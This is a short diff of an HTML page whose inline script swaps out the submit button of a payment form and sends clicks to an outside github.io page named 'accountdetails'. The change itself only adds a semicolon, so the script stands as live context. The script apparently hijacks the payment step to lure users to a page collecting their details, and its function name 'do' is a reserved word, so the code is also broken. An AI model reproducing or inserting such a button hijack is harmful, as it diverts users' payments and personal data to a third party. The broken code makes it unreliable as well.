@@ -1,7 +1,7 @@
 <html lang="en"><head>
   <script>
     function do(){
-      var old_element = document.querySelector("#root > div > div > div.App-Payment > form > div:nth-child(2) > div:nth-child(4) > button")
+      var old_element = document.querySelector("#root > div > div > div.App-Payment > form > div:nth-child(2) > div:nth-child(4) > button");
       var new_element = old_element.cloneNode(true);
       old_element.parentNode.replaceChild(new_element, old_element);
       document.querySelector("#root > div > div > div.App-Payment > form > div:nth-child(2) > div:nth-child(4) > button").onclick = function(){location.href='https://unrankedsmurf.github.io/accountdetails'};
